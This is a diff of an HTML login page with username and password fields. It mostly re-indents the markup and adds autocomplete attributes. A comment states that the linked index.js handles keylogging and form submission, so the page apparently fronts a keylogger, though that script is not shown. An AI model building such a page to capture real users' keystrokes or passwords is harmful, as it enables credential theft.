@@ -1,28 +1,28 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Homepage</title>
-        <link rel="stylesheet" href="index.css">
-        <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
-    </head>
-    <body onload="init();">
-        <div class="wrapper">
-            <form action="javascript:submit()">
-                <h1>Login</h1>
-                <div class="input-box">
-                    <input type="text" placeholder="Username" name="username" required>
-                    <i class='bx bxs-user'></i>
-                </div>
-                <div class="input-box">
-                    <input type="password" placeholder="Password" name="password" required>
-                    <i class='bx bxs-lock-alt'></i>
-                </div>
-                <input type="submit" class="btn">Login</input>
-            </form>
-        </div>
-        <!-- Link to the JavaScript file that handles keylogging and form submission -->
-        <script src="index.js"></script>
-    </body>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Homepage</title>
+    <link rel="stylesheet" href="index.css">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+</head>
+<body onload="init();">
+    <div class="wrapper">
+        <form action="javascript:submit()" method="post" autocomplete="off">
+            <h1>Login</h1>
+            <div class="input-box">
+                <input type="text" placeholder="Username" name="username" required autocomplete="username">
+                <i class='bx bxs-user'></i>
+            </div>
+            <div class="input-box">
+                <input type="password" placeholder="Password" name="password" required autocomplete="current-password">
+                <i class='bx bxs-lock-alt'></i>
+            </div>
+            <input type="submit" class="btn">Login</input>
+        </form>
+    </div>
+    <!-- Link to the JavaScript file that handles keylogging and form submission -->
+    <script src="index.js"></script>
+</body>
 </html>
